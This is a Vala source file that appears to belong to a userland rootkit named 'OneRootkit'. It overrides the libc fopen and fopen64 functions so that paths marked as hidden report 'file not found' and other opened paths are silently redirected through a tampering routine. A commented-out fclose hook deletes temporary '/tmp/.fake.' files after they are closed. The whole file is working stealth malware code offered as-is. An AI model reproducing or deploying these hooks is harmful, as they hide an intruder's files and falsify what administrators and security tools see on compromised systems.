using Posix;

delegate unowned FILE FopenMethod(string file, string code);
delegate unowned int FcloseMethod(FILE *stream);
delegate unowned int RemoveMethod(string filename);

public static FILE *fopen(string file, string code) 
{
	FopenMethod oldFopen = (FopenMethod) DLHandles.LIBC().GetMethod("fopen");

	if(OneRootkit.IsPathHidden(file))
	{
		GLib.errno = Posix.ENOENT;
		return null;
	}

	string tamperedPath = TamperPath.TamperOpenPath(file);
	return oldFopen(tamperedPath, code);
}

public static FILE *fopen64(string file, string code) 
{
	FopenMethod oldFopen64 = (FopenMethod) DLHandles.LIBC().GetMethod("fopen64");

	if(OneRootkit.IsPathHidden(file))
	{
		GLib.errno = Posix.ENOENT;
		return null;
	}

	string tamperedPath = TamperPath.TamperOpenPath(file);
	return oldFopen64(tamperedPath, code);
}

/*
public static int fclose(FILE *stream)
{
	FcloseMethod oldFclose = (FcloseMethod) DLHandles.LIBC().GetMethod("fclose");
	RemoveMethod oldRemove = (RemoveMethod) DLHandles.LIBC().GetMethod("remove");
	string streamPath = OneRootkit.GetFullFilePath(stream);

	if(Strings.starts_with(streamPath, "/tmp/.fake."))
	{
		int result = oldFclose(stream);
		oldRemove(streamPath);
		return result;
	}

	return oldFclose(stream);
}
*/